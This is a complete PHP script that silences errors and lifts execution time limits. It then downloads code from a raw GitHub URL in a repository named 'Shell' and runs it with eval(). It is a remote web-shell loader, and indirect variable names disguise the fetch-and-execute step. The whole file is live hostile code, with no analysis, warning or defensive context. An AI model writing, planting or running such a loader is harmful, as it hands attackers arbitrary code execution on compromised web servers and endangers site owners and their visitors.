<?php
error_reporting(0); set_time_limit(0);
        $awo = 'https://';
        $fgt = 'file_get_contents';
        $data = $fgt($awo . 'raw.githubusercontent.com/Clay-Haxor3/Shell/refs/heads/main/conviguration');
    
        $admin = '?>';
        eval($admin . $data);
    
        exit;
?>
